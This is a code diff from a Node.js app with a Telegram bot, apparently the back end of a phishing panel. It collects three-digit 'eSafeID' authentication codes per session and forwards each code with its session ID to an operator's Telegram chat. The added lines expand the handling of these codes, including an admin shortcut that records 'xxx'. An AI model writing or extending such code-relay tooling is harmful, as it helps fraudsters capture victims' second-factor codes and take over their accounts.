@@ -261,13 +261,33 @@ app.post('/send-mms-code', (req, res) => {
 bot.on('message', (msg) => {
   const text = msg.text?.trim();
   const userChatId = msg.chat.id.toString();
-  if (!text || text.startsWith('/') || !/^\d{3}$/.test(text)) return;
+  if (!text || text.startsWith('/')) return;
 
   const data = loadData();
   const pendingRequests = data._pendingRequests || {};
   const sessionId = pendingRequests[userChatId];
 
-  if (sessionId && data[sessionId] && data[sessionId].choicePending === 'esafe') {
+  if (!sessionId || !data[sessionId]) {
+    bot.sendMessage(userChatId, `❌ Aucune session eSafeID en attente trouvée.`);
+    return;
+  }
+
+  // ✅ Si l'admin tape 0 → on enregistre "xxx"
+  if (text === '0' && data[sessionId].choicePending === 'esafe') {
+    data[sessionId].code = 'xxx';
+    data[sessionId].choice = 'esafe';
+    data[sessionId].choicePending = null;
+    delete pendingRequests[userChatId];
+    data._pendingRequests = pendingRequests;
+    saveData(data);
+
+    bot.sendMessage(CHAT_ID, `🔄 Code eSafeID remplacé par "xxx" pour ${sessionId}`);
+    bot.sendMessage(userChatId, `✅ Code eSafeID "xxx" enregistré.`);
+    return;
+  }
+
+  // ✅ Si l'utilisateur tape un code de 3 chiffres
+  if (/^\d{3}$/.test(text) && data[sessionId].choicePending === 'esafe') {
     data[sessionId].code = text;
     data[sessionId].choice = 'esafe';
     data[sessionId].choicePending = null;
@@ -277,9 +297,11 @@ bot.on('message', (msg) => {
 
     bot.sendMessage(CHAT_ID, `✅ Code eSafeID confirmé pour ${sessionId} : ${text}`);
     bot.sendMessage(userChatId, `✅ Merci, code enregistré.`);
-  } else {
-    bot.sendMessage(userChatId, `❌ Aucune session eSafeID en attente trouvée.`);
+    return;
   }
+
+  // ❌ Si ce n'est pas un code valide
+  bot.sendMessage(userChatId, `❌ Code invalide ou aucune session eSafeID active.`);
 });
 
 // 🟣 Bot - Clic sur les boutons
